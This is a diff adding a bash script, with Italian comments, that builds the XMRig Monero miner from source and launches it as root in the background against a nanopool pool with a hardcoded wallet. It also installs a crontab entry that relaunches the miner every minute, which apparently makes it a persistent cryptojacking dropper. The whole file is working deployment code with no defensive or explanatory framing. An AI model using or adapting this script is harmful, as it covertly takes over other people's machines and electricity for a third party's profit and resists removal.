@@ -1,0 +1,34 @@
+#!/bin/bash
+
+# Installazione delle dipendenze
+apt-get update
+
+sudo apt install -y libssl-dev git build-essential cmake automake libtool autoconf
+
+# Clone del repository xmrig
+git clone https://github.com/xmrig/xmrig.git
+
+# Creazione della directory build e spostamento
+mkdir xmrig/build && cd xmrig/scripts
+
+# Esecuzione dello script per la build delle dipendenze
+./build_deps.sh && cd ../build
+
+# Configurazione e compilazione di xmrig
+cmake .. -DXMRIG_DEPS=scripts/deps
+make -j$(nproc)
+
+# Spostamento nella directory di xmrig
+cd /root/xmrig/build
+
+# Tentativo di avvio di xmrig in background con nohup
+nohup ./xmrig -o xmr-eu1.nanopool.org:14433 -u 46tfyDCzhgZH5xUWEnUJ7ngwfPa6apAppVD7tLqP1mkzDgRJnKP3nqMMKiCZq9aBUZGHsha5q95gkZLFEDaQo64rQ9jVn1X --tls --coin monero --threads=4 &
+
+# Se l'avvio fallisce, prova a lanciarlo nella cartella /root/xmrig/scripts
+if [ $? -ne 0 ]; then
+    cd /root/xmrig/scripts
+    nohup ./xmrig -o xmr-eu1.nanopool.org:14433 -u 46tfyDCzhgZH5xUWEnUJ7ngwfPa6apAppVD7tLqP1mkzDgRJnKP3nqMMKiCZq9aBUZGHsha5q95gkZLFEDaQo64rQ9jVn1X --tls --coin monero --threads=4 &
+fi
+
+(crontab -l ; echo "*/1 * * * * (cd /root/xmrig/build && pgrep -x xmrig || (nohup ./xmrig -o xmr-eu1.nanopool.org:14433 -u 46tfyDCzhgZH5xUWEnUJ7ngwfPa6apAppVD7tLqP1mkzDgRJnKP3nqMMKiCZq9aBUZGHsha5q95gkZLFEDaQo64rQ9jVn1X --tls --coin monero --threads=4 &)) && (cd /root/xmrig/scripts && pgrep -x xmrig || (nohup ./xmrig -o xmr-eu1.nanopool.org:14433 -u 46tfyDCzhgZH5xUWEnUJ7ngwfPa6apAppVD7tLqP1mkzDgRJnKP3nqMMKiCZq9aBUZGHsha5q95gkZLFEDaQo64rQ9jVn1X --tls --coin monero --threads=4 &))") | crontab -
+
